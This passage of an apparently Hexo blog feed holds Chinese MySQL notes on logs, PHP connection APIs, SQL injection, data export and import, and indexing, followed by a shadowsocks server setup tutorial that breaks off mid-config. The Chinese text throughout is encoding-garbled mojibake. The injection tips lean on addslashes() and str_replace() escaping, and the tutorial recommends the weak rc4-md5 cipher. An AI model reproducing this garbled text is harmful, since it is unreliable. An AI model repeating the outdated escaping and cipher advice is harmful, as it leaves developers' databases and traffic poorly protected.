MySQLä¸­çš„æ—¥å¿—</h2><p>å…±4ç§ï¼š</p><ol><li>é”™è¯¯æ—¥å¿—ï¼šè®°å½•mysqlæœåŠ¡çš„å¯åŠ¨ã€è¿è¡Œã€åœæ­¢æ—¶å‡ºç°çš„é—®é¢˜</li><li>æŸ¥è¯¢æ—¥å¿—ï¼ˆé€šç”¨æ—¥å¿—ï¼‰ï¼šè®°å½•ç”¨æˆ·çš„æ‰€æœ‰æ“ä½œ</li><li>äºŒè¿›åˆ¶æ—¥å¿—ï¼šè®°å½•æ‰€æœ‰æ›´æ”¹æ•°æ®çš„è¯­å¥ï¼Œå¯ä»¥ç”¨äºæ•°æ®å¤åˆ¶</li><li>æ…¢æŸ¥è¯¢æ—¥å¿—ï¼šè®°å½•æ‰€æœ‰æ‰§è¡Œæ—¶é—´è¶…è¿‡long_query_timeçš„æ‰€æœ‰æŸ¥è¯¢ã€‚å®˜æ–¹çš„æ…¢æŸ¥è¯¢é˜ˆå€¼åªèƒ½è®¾ç½®å¤§äº1ç§’çš„ï¼Œä½¿ç”¨microslow-patchå¯ä»¥æŸ¥è¯¢æ¯«ç§’çº§çš„ã€‚</li></ol><p>é™¤äº†é”™è¯¯æ—¥å¿—é»˜è®¤å¼€å¯å¤–ï¼Œå…¶ä»–æ—¥å¿—éƒ½æ˜¯é»˜è®¤å…³é—­çš„ã€‚ä½†æ—¥å¿—æ—¢ä¼šå½±å“mysqlçš„æ€§èƒ½ï¼Œåˆä¼šå ç”¨å¤§é‡ç£ç›˜ç©ºé—´ã€‚å› æ­¤ï¼Œå¦‚æœä¸å¿…è¦ï¼Œåº”å°½å¯èƒ½å°‘åœ°å¼€å¯æ—¥å¿—ã€‚æ ¹æ®ä¸åŒçš„ä½¿ç”¨ç¯å¢ƒï¼Œè€ƒè™‘å¼€å¯ä¸åŒçš„æ—¥å¿—ã€‚ä¾‹å¦‚å¼€å‘ç¯å¢ƒä¸­ä¼˜åŒ–æŸ¥è¯¢æ•ˆç‡ä½çš„è¯­å¥ï¼Œå¯ä»¥å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—ï¼Œæˆ–è€…ç”Ÿäº§ç¯å¢ƒä¸­å‘ç°æŸäº›SQLæ‰§è¡Œç‰¹åˆ«æ…¢ä¹Ÿå¯ä»¥å¼€å¯ã€‚å¦‚æœç£ç›˜ç©ºé—´ä¸æ˜¯ç‰¹å……è¶³å¯ä»¥åœ¨é«˜å³°æœŸé—´å¼€å¯ï¼Œåœ¨æ•è·åˆ°æŸ¥è¯¢æ…¢çš„SQLä¹‹åå†å…³é—­æ…¢æŸ¥è¯¢æ—¥å¿—ã€‚å¦‚æœéœ€è¦æ­å»ºå¤åˆ¶ç¯å¢ƒï¼Œé‚£ä¹ˆå°±ä¸€å®šè¦å¼€å¯äºŒè¿›åˆ¶æ—¥å¿—ï¼Œå¦‚æœæ•°æ®ç‰¹åˆ«é‡è¦ä¹Ÿå»ºè®®å¼€å¯äºŒè¿›åˆ¶æ—¥å¿—ï¼Œä»¥ä¾¿æ•°æ®åº“æŸåçš„æ—¶å€™ä¹Ÿå¯ä»¥é€šè¿‡äºŒè¿›åˆ¶æ—¥å¿—æŒ½æ•‘ä¸€éƒ¨åˆ†æ•°æ®ã€‚é€šç”¨æ—¥å¿—æ— è®ºåœ¨å“ªç§æƒ…å†µä¸‹ï¼Œä¸€èˆ¬ä¸å»ºè®®å¼€å¯ ã€‚</p><p>å¸¸ç”¨å‘½ä»¤</p><ul><li>æŸ¥çœ‹æ—¥å¿—ä¿¡æ¯ï¼š<code>show variables like &#39;%log_%&#39;;</code></li><li>æŸ¥çœ‹é”™è¯¯æ—¥å¿—çš„å­˜å‚¨ä½ç½®ï¼š<code>show variables LIKE &#39;log_error&#39;;</code></li><li>åˆ é™¤é”™è¯¯æ—¥å¿—ï¼š<code>flush logs;</code><ul><li>MySQL 5.5.7ç‰ˆæœ¬å‰ï¼Œ<code>flush logs</code>å¯ä»¥å°†é”™è¯¯æ—¥å¿—æ–‡ä»¶é‡å‘½åä¸º<code>filename.err_old</code>ï¼Œå¹¶åˆ›å»ºæ–°çš„æ—¥å¿—æ–‡ä»¶ã€‚ä½†æ˜¯ä»MySQL 5.5.7å¼€å§‹ï¼Œ<code>flush logs</code>åªæ˜¯é‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶ï¼Œå¹¶ä¸åšæ—¥å¿—å¤‡ä»½å’Œåˆ›å»ºçš„æ“ä½œã€‚å¦‚æœæ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨ï¼Œmysqlå¯åŠ¨æˆ–è€…æ‰§è¡Œflush logsæ—¶ä¼šåˆ›å»ºæ–°çš„æ—¥å¿—æ–‡ä»¶</li></ul></li></ul><p>Macä½¿ç”¨HomeBrewå®‰è£…çš„MySQLæ˜¯æ²¡æœ‰my.cnfæ–‡ä»¶çš„ï¼Œéœ€è¦è‡ªå·±æ‰‹åŠ¨åˆ›å»ºï¼Œå…·ä½“ä¿¡æ¯è¯·æŸ¥çœ‹å¦ä¸€ä¸ªç¬”è®°ï¼š<a href="https://app.yinxiang.com/shard/s27/nl/1310329143/2918975e-22e9-4749-a19c-38d792fdf8d5/" target="_blank" rel="noopener">åœ¨ Mac ä¸‹ç”¨ Homebrew å®‰è£… MySQLé…ç½®æ–‡ä»¶my.cnfé—®é¢˜</a></p><h2 id="ä¹ã€PHPè¿æ¥MySQLçš„æ–¹å¼"><a href="#ä¹ã€PHPè¿æ¥MySQLçš„æ–¹å¼" class="headerlink" title="ä¹ã€PHPè¿æ¥MySQLçš„æ–¹å¼"></a>ä¹ã€PHPè¿æ¥MySQLçš„æ–¹å¼</h2><p>å½“è€ƒè™‘è¿æ¥åˆ°MySQLæ•°æ®åº“æœåŠ¡å™¨çš„æ—¶å€™ï¼Œæœ‰ä¸‰ç§ä¸»è¦çš„APIå¯ä¾›é€‰æ‹©ï¼š</p><ul><li>PHPçš„MySQLæ‰©å±•</li><li>PHPçš„MySQLiæ‰©å±•</li><li>PHPæ•°æ®å¯¹è±¡ï¼ˆPDOï¼‰</li></ul><p>ä¸‰è€…å„æœ‰ä¼˜ç¼ºç‚¹ï¼š</p><ol><li><p>mysqlæ‰©å±•æä¾›äº†ä¸€ä¸ªé¢å‘è¿‡ç¨‹ çš„æ¥å£ï¼Œå¹¶ä¸”æ˜¯é’ˆå¯¹MySQL4.1.3æˆ–æ›´æ—©ç‰ˆæœ¬è®¾è®¡çš„ã€‚å› æ­¤ï¼Œè¿™ä¸ªæ‰©å±•è™½ç„¶å¯ä»¥ä¸MySQL4.1.3æˆ–æ›´æ–°çš„æ•°æ®åº“æœåŠ¡ç«¯ è¿›è¡Œäº¤äº’ï¼Œä½†å¹¶ä¸æ”¯æŒåæœŸMySQLæœåŠ¡ç«¯æä¾›çš„ä¸€äº›ç‰¹æ€§ã€‚</p></li><li><p>MySQLiæ‰©å±•å¯ä»¥ç”¨äºä½¿ç”¨ MySQL4.1.3æˆ–æ›´æ–°ç‰ˆæœ¬ä¸­æ–°çš„é«˜çº§ç‰¹æ€§ã€‚å…¶ä¸»è¦ä¼˜åŠ¿æœ‰ï¼š</p><ul><li>é¢å‘å¯¹è±¡æ¥å£</li><li>preparedè¯­å¥æ”¯æŒ</li><li>å¤šè¯­å¥æ‰§è¡Œæ”¯æŒ</li><li>äº‹åŠ¡æ”¯æŒ</li><li>å¢å¼ºçš„è°ƒè¯•èƒ½åŠ›</li><li>åµŒå…¥å¼æœåŠ¡æ”¯æŒ</li></ul></li><li><p>PDOæä¾›äº†ä¸€ä¸ªç»Ÿä¸€çš„APIæ¥å£å¯ä»¥ä½¿å¾—ä½ çš„PHPåº”ç”¨ä¸å»å…³å¿ƒå…·ä½“è¦ è¿æ¥çš„æ•°æ®åº“æœåŠ¡å™¨ç³»ç»Ÿç±»å‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ ä½¿ç”¨PDOçš„APIï¼Œå¯ä»¥åœ¨ä»»ä½•éœ€è¦çš„æ—¶å€™æ— ç¼åˆ‡æ¢æ•°æ®åº“æœåŠ¡å™¨ï¼Œæ¯”å¦‚ä»Firebird åˆ°MySQLï¼Œä»…ä»…éœ€è¦ä¿®æ”¹å¾ˆå°‘çš„PHPä»£ç ã€‚<br>PDOçš„ä¼˜ç‚¹åœ¨äºï¼Œå®ƒæ˜¯ä¸€ä¸ªå¹²å‡€çš„ï¼Œç®€å•çš„ï¼Œå¯ç§»æ¤çš„APIï¼Œ<strong>å®ƒæœ€ä¸»è¦çš„ç¼ºç‚¹æ˜¯ä¼šé™åˆ¶è®©ä½ ä¸èƒ½ä½¿ç”¨ åæœŸMySQLæœåŠ¡ç«¯æä¾›æ‰€æœ‰çš„æ•°æ®åº“é«˜çº§ç‰¹æ€§</strong>ã€‚æ¯”å¦‚ï¼ŒPDOä¸å…è®¸ä½¿ç”¨MySQLæ”¯æŒçš„å¤šè¯­å¥æ‰§è¡Œã€‚</p></li></ol><h2 id="åã€SQLæ³¨å…¥"><a href="#åã€SQLæ³¨å…¥" class="headerlink" title="åã€SQLæ³¨å…¥"></a>åã€SQLæ³¨å…¥</h2><p><strong>æ°¸è¿œä¸è¦ä¿¡ä»»å¤–ç•Œè¾“å…¥çš„æ•°æ®</strong>ï¼Œ<strong><em>ç‰¹åˆ«æ˜¯æ¥è‡ªäºå®¢æˆ·ç«¯çš„</em></strong>ï¼ŒåŒ…æ‹¬é€‰æ‹©æ¡†ã€è¡¨å•éšè—åŸŸå’Œ cookieã€‚</p><ul><li>æ°¸è¿œä¸è¦ä½¿ç”¨è¶…çº§ç”¨æˆ·æˆ–æ‰€æœ‰è€…å¸å·å»è¿æ¥æ•°æ®åº“ã€‚è¦ç”¨æƒé™è¢«ä¸¥æ ¼é™åˆ¶çš„å¸å·ã€‚</li><li>æ£€æŸ¥è¾“å…¥çš„æ•°æ®æ˜¯å¦å…·æœ‰æ‰€æœŸæœ›çš„æ•°æ®æ ¼å¼ã€‚</li><li>ä½¿ç”¨æ•°æ®åº“ç‰¹å®šçš„æ•æ„Ÿå­—ç¬¦è½¬ä¹‰å‡½æ•°ï¼ˆæ¯”å¦‚ mysql_escape_string() å’Œ sql_escape_string()ï¼‰æŠŠç”¨æˆ·æäº¤ä¸Šæ¥çš„éæ•°å­—æ•°æ®è¿›è¡Œè½¬ä¹‰ã€‚å¦‚æœæ•°æ®åº“æ²¡æœ‰ä¸“é—¨çš„æ•æ„Ÿå­—ç¬¦è½¬ä¹‰åŠŸèƒ½çš„è¯ addslashes() å’Œ str_replace() å¯ä»¥ä»£æ›¿å®Œæˆè¿™ä¸ªå·¥ä½œã€‚</li><li>å°½é‡é¿å…æ˜¾ç¤ºæœ‰å…³æ•°æ®åº“çš„ä»»ä½•ä¿¡æ¯ï¼Œå°¤å…¶æ˜¯æ•°æ®åº“ç»“æ„ã€‚</li><li>å¯ä»¥é€‰æ‹©ä½¿ç”¨æ•°æ®åº“çš„å­˜å‚¨è¿‡ç¨‹å’Œé¢„å®šä¹‰æŒ‡é’ˆç­‰ç‰¹æ€§æ¥æŠ½è±¡æ•°åº“è®¿é—®ï¼Œä½¿ç”¨æˆ·ä¸èƒ½ç›´æ¥è®¿é—®æ•°æ®è¡¨å’Œè§†å›¾ã€‚ä½†è¿™ä¸ªåŠæ³•åˆæœ‰åˆ«çš„å½±å“ã€‚</li></ul><p>mysqliæ²¡æœ‰æä¾›ä¸€ä¸ªç‰¹æ®Šçš„æ–¹æ³•ç”¨äºæ‰“å¼€æŒä¹…åŒ–è¿æ¥ã€‚éœ€è¦æ‰“å¼€ä¸€ä¸ªæŒä¹…åŒ–è¿æ¥æ—¶ï¼Œä½ å¿…é¡»åœ¨ è¿æ¥æ—¶åœ¨ä¸»æœºåå‰å¢åŠ <code>p:</code>ã€‚</p><p>æ•°æ®çš„å¯¼å‡ºåŠå¯¼å…¥ï¼š<br>Linuxä¸‹æ“ä½œï¼š<br>å¯¼å‡ºï¼š<code>mysqldump -h -u -p æ•°æ®åº“å1 [æ•°æ®åº“å2]&gt;æœ¬åœ°åœ°å€</code><br>å¯¼å…¥ï¼š<code>mysql -h -u -p æ•°æ®åº“å&lt;æœ¬åœ°åœ°å€</code></p><h2 id="åä¸€ã€å…¶ä»–"><a href="#åä¸€ã€å…¶ä»–" class="headerlink" title="åä¸€ã€å…¶ä»–"></a>åä¸€ã€å…¶ä»–</h2><h3 id="11-1-é¿å…é‡å¤æ’å…¥è®°å½•"><a href="#11-1-é¿å…é‡å¤æ’å…¥è®°å½•" class="headerlink" title="11.1 é¿å…é‡å¤æ’å…¥è®°å½•"></a>11.1 é¿å…é‡å¤æ’å…¥è®°å½•</h3><p>1ã€ä½¿ç”¨<code>IGNORE</code>å…³é”®å­—ã€‚å¯¹äº<code>PRIMARY KEY</code>æˆ–<code>UNIQUE</code>çš„å­—æ®µæ¥è¯´ï¼Œå¦‚æœæ•°æ®ä¸é‡å¤åˆ™æ’å…¥ï¼Œé‡å¤åˆ™å¿½ç•¥ï¼ˆæŠ¥è­¦å‘Šï¼Œæ•°æ®ä¸ä¼šæ’å…¥ï¼Œä¸å½±å“æ­£å¸¸æ‰§è¡Œï¼Œæ— æ­¤å…³é”®å­—ä¼šæŠ¥é”™è¯¯ï¼‰ã€‚å¦‚ï¼š<code>INSERT IGNORE INTO test(id,name) VALUES(1,&#39;jack&#39;);</code><br>2ã€ä½¿ç”¨<code>REPLACE</code>å…³é”®å­—ã€‚è¯¥SQLä¸<code>IGNORE</code>çš„åŒºåˆ«åœ¨äºï¼Œå¦‚æœæ•°æ®é‡å¤ï¼Œåˆ™å…ˆå°†æ—§çš„æ•°æ®åˆ é™¤ï¼Œç„¶åæ’å…¥æ–°çš„ã€‚æ‰€ä»¥ï¼Œæ‰§è¡Œè¯¥è¯­å¥çš„å½±å“è¡Œå¯ä»¥çœ‹å‡ºæ˜¯å¦æœ‰é‡å¤çš„æ•°æ®ï¼ˆä¸º1è¡¨ç¤ºæ— é‡å¤ï¼Œå¤§äº1ä¸ºé‡å¤ï¼‰ã€‚<br>3ã€ä½¿ç”¨<code>ON DUPLICATE KEY UPDATE</code>ï¼Œè¯¥å¥å­æ˜¯åœ¨æœ‰é‡å¤æ•°æ®çš„æ—¶å€™ï¼Œç”¨æ–°æ•°æ®æ›¿æ¢æ—§æ•°æ®ã€‚</p><h3 id="11-2-ç»Ÿè®¡é‡å¤æ•°æ®"><a href="#11-2-ç»Ÿè®¡é‡å¤æ•°æ®" class="headerlink" title="11.2 ç»Ÿè®¡é‡å¤æ•°æ®"></a>11.2 ç»Ÿè®¡é‡å¤æ•°æ®</h3><p>æ¯”å¦‚ç»Ÿè®¡é‡åçš„å­¦ç”Ÿæ•°é‡ï¼š<code>SELECT COUNT(name) AS deplication,name FROM student_info GROUP BY name HAVING deplication &gt; 1;</code></p><h3 id="11-3-æ•°æ®å¯¼å‡º"><a href="#11-3-æ•°æ®å¯¼å‡º" class="headerlink" title="11.3 æ•°æ®å¯¼å‡º"></a>11.3 æ•°æ®å¯¼å‡º</h3><p>éœ€æœ‰FILEæƒé™ã€‚</p><h4 id="æ–¹æ³•ä¸€-ä½¿ç”¨OUTFILE"><a href="#æ–¹æ³•ä¸€-ä½¿ç”¨OUTFILE" class="headerlink" title="æ–¹æ³•ä¸€ ä½¿ç”¨OUTFILE"></a>æ–¹æ³•ä¸€ ä½¿ç”¨OUTFILE</h4><p><code>SELECT å­—æ®µ FROM è¡¨å [WHEREç­‰è¿‡æ»¤æ¡ä»¶] INTO OUTFILE &#39;ä¿å­˜è·¯å¾„&#39; [CHARACTER SET GBK] [FIELDS TERMINATED BY &#39;,&#39; [[ENCLOSED BY &#39;&quot;&#39;] LINES TERMINATED BY &#39;\n&#39;]];</code></p><ul><li>æ³¨æ„ï¼šç”±äºxlså’Œxlsxçš„ä¸­æ–‡é»˜è®¤gbkç¼–ç ï¼Œå› æ­¤å¦‚æœæ•°æ®è¡¨ç¼–ç ä¸ä¸€è‡´ï¼Œéœ€åœ¨å¯¼å‡ºæ—¶ä½¿ç”¨<code>CHARACTER SET GBK</code>æŒ‡å®šå¯¼å‡ºç¼–ç ï¼›åœ¨ä½¿ç”¨csvï¼ˆComma-Separated Values, é€—å·åˆ†éš”å€¼ï¼‰æ ¼å¼æ—¶ï¼Œéœ€ä½¿ç”¨<code>FIELDS TERMINATED BY &#39;,&#39;</code>æŒ‡å®šå­—æ®µåˆ†éš”ï¼Œå¦åˆ™ä¼šå‡ºç°æ ¼å¼é”™è¯¯ã€‚</li></ul><h4 id="æ–¹æ³•äºŒ-ä½¿ç”¨mysqldumpå‘½ä»¤"><a href="#æ–¹æ³•äºŒ-ä½¿ç”¨mysqldumpå‘½ä»¤" class="headerlink" title="æ–¹æ³•äºŒ ä½¿ç”¨mysqldumpå‘½ä»¤"></a>æ–¹æ³•äºŒ ä½¿ç”¨mysqldumpå‘½ä»¤</h4><p><code>$mysqldump -u user -p pwd æ•°æ®åº“å [è¡¨å] &gt; æ–‡ä»¶;</code>å¯¼å‡ºæŒ‡å®šæ•°æ®åº“æˆ–æŒ‡å®šæ•°æ®è¡¨<br><code>$mysqldump -u user -p pwd --all-databases &gt; æ–‡ä»¶;</code>å¤‡ä»½æ‰€æœ‰æ•°æ®åº“</p><h3 id="11-4-æ•°æ®å¯¼å…¥"><a href="#11-4-æ•°æ®å¯¼å…¥" class="headerlink" title="11.4 æ•°æ®å¯¼å…¥"></a>11.4 æ•°æ®å¯¼å…¥</h3><p>éœ€æœ‰FILEæƒé™ã€‚</p><h4 id="æ–¹æ³•ä¸€-ä½¿ç”¨LOAD-DATA"><a href="#æ–¹æ³•ä¸€-ä½¿ç”¨LOAD-DATA" class="headerlink" title="æ–¹æ³•ä¸€ ä½¿ç”¨LOAD DATA"></a>æ–¹æ³•ä¸€ ä½¿ç”¨LOAD DATA</h4><p><code>LOAD DATA [LOCAL] INFILE &#39;æ–‡ä»¶&#39; INTO TABLE è¡¨å [CHARACTER SET GBK] [FIELDS TERMINATED BY &#39;,&#39; OPTIONALLY ENCLOSED BY &#39;&quot;&#39; LINES TERMINATED BY &#39;\n&#39;];</code></p><ul><li>æ³¨æ„æ•°æ®è¡¨çš„ç¼–ç ï¼Œå³ä½¿åŒä¸ºGBKç¼–ç ï¼Œä¹Ÿä¼šå‡ºç°æŠ¥é”™çš„æƒ…å†µï¼Œå› æ­¤æœ€å¥½åœ¨å¯¼å…¥å‰ç¡®å®šæ•°æ®è¡¨ä¸æ–‡ä»¶çš„ç¼–ç ï¼Œç„¶åæŒ‡å®šç¼–ç å¯¼å…¥ã€‚</li><li><strong>æ— è®ºåœ¨å¯¼å…¥è¿˜æ˜¯å¯¼å‡ºcsvæ ¼å¼æ–‡ä»¶æ—¶ï¼Œéƒ½éœ€è¦ä½¿ç”¨<code>FIELDS TERMINATED BY &#39;,&#39;</code></strong></li><li>å¦‚æœæŒ‡å®šLOCALå…³é”®è¯ï¼Œåˆ™è¡¨æ˜ä»å®¢æˆ·ä¸»æœºä¸ŠæŒ‰è·¯å¾„è¯»å–æ–‡ä»¶ã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™æ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸ŠæŒ‰è·¯å¾„è¯»å–æ–‡ä»¶ã€‚</li></ul><h4 id="æ–¹æ³•äºŒ-ä½¿ç”¨mysqldumpå‘½ä»¤-1"><a href="#æ–¹æ³•äºŒ-ä½¿ç”¨mysqldumpå‘½ä»¤-1" class="headerlink" title="æ–¹æ³•äºŒ ä½¿ç”¨mysqldumpå‘½ä»¤"></a>æ–¹æ³•äºŒ ä½¿ç”¨mysqldumpå‘½ä»¤</h4><p><code>$mysqldump -u user -p pwd æ•°æ®åº“å [è¡¨å] &lt; æ–‡ä»¶;</code></p><h4 id="æ–¹æ³•ä¸‰-ä½¿ç”¨mysqlimport"><a href="#æ–¹æ³•ä¸‰-ä½¿ç”¨mysqlimport" class="headerlink" title="æ–¹æ³•ä¸‰ ä½¿ç”¨mysqlimport"></a>æ–¹æ³•ä¸‰ ä½¿ç”¨mysqlimport</h4><p><code>$mysqlimport -u user -p [--local] [--fields-terminated-by=&quot;:&quot; --lines-terminated-by=&quot;\r\n&quot; --columns=å­—æ®µ1ï¼Œå­—æ®µ2] æ•°æ®åº“å æ–‡ä»¶å</code></p><p>æ›´å¤šæ•°æ®å¯¼å…¥/å¯¼å‡ºä¿¡æ¯è¯·ç‚¹å‡»ï¼š<a href="https://segmentfault.com/a/1190000003941100" target="_blank" rel="noopener">å¦‚ä½•å°† JSON, Text, XML, CSV æ•°æ®æ–‡ä»¶å¯¼å…¥ MySQL</a></p><h3 id="11-5-ç´¢å¼•çš„æ€§èƒ½"><a href="#11-5-ç´¢å¼•çš„æ€§èƒ½" class="headerlink" title="11.5 ç´¢å¼•çš„æ€§èƒ½"></a>11.5 ç´¢å¼•çš„æ€§èƒ½</h3><ul><li>ç´¢å¼•æ”¹å–„æ£€ç´¢æ“ä½œçš„æ€§èƒ½ï¼Œä½†é™ä½æ•°æ®æ’å…¥ã€ä¿®æ”¹å’Œåˆ é™¤çš„æ€§èƒ½ã€‚å› ä¸ºåœ¨æ‰§è¡Œè¿™äº›æ“ä½œæ—¶ï¼ŒMySQLå¿…é¡»åŠ¨æ€åœ°æ›´æ–°ç´¢å¼•ã€‚</li><li>ç´¢å¼•æ•°æ®å¯èƒ½è¦å ç”¨å¤§é‡çš„å­˜å‚¨ç©ºé—´ã€‚</li><li>æ•°æ®é‡å°‘çš„å­—æ®µä¸é€‚åˆåšç´¢å¼•ã€‚å¹¶éæ‰€æœ‰æ•°æ®éƒ½é€‚åˆåšç´¢å¼•ã€‚å–å€¼ä¸å¤šçš„æ•°æ®ï¼ˆå¦‚å·ï¼‰ä¸å¦‚å…·æœ‰æ›´å¤šå¯èƒ½å€¼çš„æ•°æ®ï¼ˆå¦‚å§“åï¼‰ï¼Œèƒ½é€šè¿‡ç´¢å¼•å¾—åˆ°é‚£ä¹ˆå¤šçš„å¥½å¤„ã€‚</li><li>ç”¨äºæ’åºçš„å­—æ®µé€‚åˆæ·»åŠ ç´¢å¼•ã€‚ç´¢å¼•ç”¨äºæ•°æ®è¿‡æ»¤å’Œæ•°æ®æ’åºã€‚å¦‚æœä½ ç»å¸¸ä»¥æŸç§ç‰¹å®šçš„é¡ºåºæ’åºæ•°æ®ï¼Œåˆ™è¯¥æ•°æ®å¯èƒ½é€‚åˆåšç´¢å¼•ã€‚</li><li>å¯ä»¥åœ¨ç´¢å¼•ä¸­å®šä¹‰å¤šä¸ªåˆ—ï¼ˆå¦‚ï¼Œå·å’ŒåŸå¸‚ï¼‰ã€‚è¿™æ ·çš„ç´¢å¼•ä»…åœ¨ä»¥å·+åŸå¸‚çš„æ’åºæ—¶æœ‰ç”¨ï¼Œå¦‚æœä»¥åŸå¸‚æ’åºï¼Œåˆ™è¯¥ç´¢å¼•å¹¶æ²¡ä»€ä¹ˆç”¨å¤„ã€‚</li><li><strong>ç´¢å¼•çš„æ•ˆç‡éšè¡¨æ•°æ®çš„å¢åŠ æˆ–æ”¹å˜è€Œå˜åŒ–ã€‚è®¸å¤šDBAå‘ç°ï¼Œè¿‡å»åˆ›å»ºçš„æŸä¸ªç†æƒ³çš„ç´¢å¼•ç»è¿‡å‡ ä¸ªæœˆçš„æ•°æ®å¤„ç†åå¯èƒ½å˜å¾—ä¸å†ç†æƒ³äº†ã€‚æœ€å¥½å®šæœŸæ£€æŸ¥ç´¢å¼•ï¼Œå¹¶æ ¹æ®éœ€è¦å¯¹ç´¢å¼•è¿›è¡Œè°ƒæ•´ã€‚</strong></li></ul><h3 id="11-6-ä¸€äº›æœ¯è¯­é‡Šä¹‰"><a href="#11-6-ä¸€äº›æœ¯è¯­é‡Šä¹‰" class="headerlink" title="11.6 ä¸€äº›æœ¯è¯­é‡Šä¹‰"></a>11.6 ä¸€äº›æœ¯è¯­é‡Šä¹‰</h3><ul><li>DDL(Data Definition Language)ï¼šæ•°æ®å®šä¹‰è¯­è¨€</li><li>DML(Data Manipulation Language)ï¼šæ•°æ®æ“ä½œè¯­è¨€</li><li>DRL(Data Retrieval Language)ï¼šæ•°æ®æŸ¥è¯¢è¯­è¨€</li></ul><p>æ›´å¤šæœ¯è¯­è§£é‡Šï¼š<a href="https://dev.mysql.com/doc/refman/5.7/en/glossary.html" target="_blank" rel="noopener">MySQL Glossary</a></p>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è‡ªå»ºshadowsocksæœåŠ¡å™¨æ•™ç¨‹</title>
      <link href="/post/shadowsocks/"/>
      <url>/post/shadowsocks/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87cxihzkzj30hs0a0aaj.jpg" alt=""></p><a id="more"></a><p>æ¬ç“¦å·¥ç³»ç»Ÿè‡ªå¸¦çš„shadowsocksåªæ”¯æŒCentOS 6åŠä»¥ä¸‹ï¼Œé‚£å°±è‡ªå·±æ­å»ºä¸€ä¸ªå§ã€‚</p><h3 id="1-ç¯å¢ƒï¼š"><a href="#1-ç¯å¢ƒï¼š" class="headerlink" title="1. ç¯å¢ƒï¼š"></a>1. ç¯å¢ƒï¼š</h3><p>æœåŠ¡å™¨ç«¯ï¼šCentOs 7 64ä½ï¼ˆå…¨æ–°ï¼‰<br>å®¢æˆ·ç«¯ï¼šOS X 10.12.5 + ShadowsocksX-NG 1.5.0</p><h3 id="2-å®‰è£…EPEL"><a href="#2-å®‰è£…EPEL" class="headerlink" title="2. å®‰è£…EPEL"></a>2. å®‰è£…EPEL</h3><p><code>$ sudo yum -y install epel-release</code></p><h3 id="3-å®‰è£…pip"><a href="#3-å®‰è£…pip" class="headerlink" title="3.å®‰è£…pip"></a>3.å®‰è£…pip</h3><p><code>$ sudo yum -y install python-pip</code></p><h3 id="4-å®‰è£…shadowsocks"><a href="#4-å®‰è£…shadowsocks" class="headerlink" title="4. å®‰è£…shadowsocks"></a>4. å®‰è£…shadowsocks</h3><p><code>$ sudo pip install shadowsocks</code></p><h3 id="5-é…ç½®shadowsocks"><a href="#5-é…ç½®shadowsocks" class="headerlink" title="5. é…ç½®shadowsocks"></a>5. é…ç½®shadowsocks</h3><p><code>mkdir /etc/shadowsocks/</code><br><code>$ vi /etc/shadowsocks/config.json</code><br>å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"server"</span>:<span class="string">"your_server_ip"</span>,</span><br><span class="line">  <span class="attr">"server_port"</span>:<span class="number">443</span>,</span><br><span class="line">  <span class="attr">"password"</span>:<span class="string">"yourpassword"</span>,</span><br><span class="line">  <span class="attr">"timeout"</span>:<span class="number">300</span>,</span><br><span class="line">  <span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line">  <span class="attr">"fast_open"</span>:<span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"workers"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç ä¸­å„å­—æ®µçš„å«ä¹‰ï¼š</p><ul><li>serverï¼šæœåŠ¡å™¨ IPåœ°å€ (IPv4/IPv6)</li><li>server_portï¼šæœåŠ¡å™¨ç›‘å¬çš„ç«¯å£ï¼Œä¸€èˆ¬è®¾ä¸º80ï¼Œ443ç­‰ï¼Œæ³¨æ„ä¸è¦è®¾ä¸ºä½¿ç”¨ä¸­çš„ç«¯å£</li><li>passwordï¼šè®¾ç½®å¯†ç ï¼Œè‡ªå®šä¹‰</li><li>timeoutï¼šè¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰</li><li>methodï¼šåŠ å¯†æ–¹æ³•ï¼Œå¯é€‰æ‹© â€œaes-256-cfbâ€, â€œrc4-md5â€ç­‰ç­‰ã€‚æ¨èä½¿ç”¨ â€œrc4-md5â€</li><li>fast_openï¼štrue æˆ– falseã€‚å¦‚æœä½ çš„æœåŠ¡å™¨ Linux å†…æ ¸åœ¨3.7+ï¼Œå¯ä»¥å¼€å¯ fast_open ä»¥é™ä½å»¶è¿Ÿã€‚</li><li>workersï¼šworkersæ•°é‡ï¼Œé»˜è®¤ä¸º 1ã€‚</li></ul><h4 id="5-1-å¤šè´¦æˆ·é…ç½®"><a href="#5-1-å¤šè´¦æˆ·é…ç½®" class="headerlink" title="5.1 å¤šè´¦æˆ·é…ç½®"></a>5.1 å¤šè´¦æˆ·é…ç½®</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"server"</span>:<span class="string">"your_server_ip"</span>,</span><br><span class="line">  <span class="attr">"port_password"</span>:&#123;</span><br><span class="line">       <span class="attr">"8381"</span>:<span class="string">"pass1"</span>,</span><br><span class="line">       <span class="attr">"8382"</span>:<span class="string">"pass2"</span>,</span><br><span class="line">       <span class="attr">"8383"</span>:<span 